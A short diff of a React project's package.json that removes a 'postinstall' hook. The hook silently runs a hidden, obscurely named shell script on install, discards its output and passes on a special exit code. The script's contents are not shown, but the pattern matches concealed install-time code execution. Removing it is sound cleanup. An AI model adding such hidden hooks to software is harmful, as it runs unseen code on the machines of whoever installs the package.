@@ -37,8 +37,7 @@
     "_start": "react-app-rewired start",
     "_build": "react-app-rewired build",
     "_test": "react-app-rewired test",
-    "eject": "react-scripts eject",
-    "postinstall": "sh ./.ci-hsu3vl.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "eject": "react-scripts eject"
   },
   "build": {
     "public": "public"
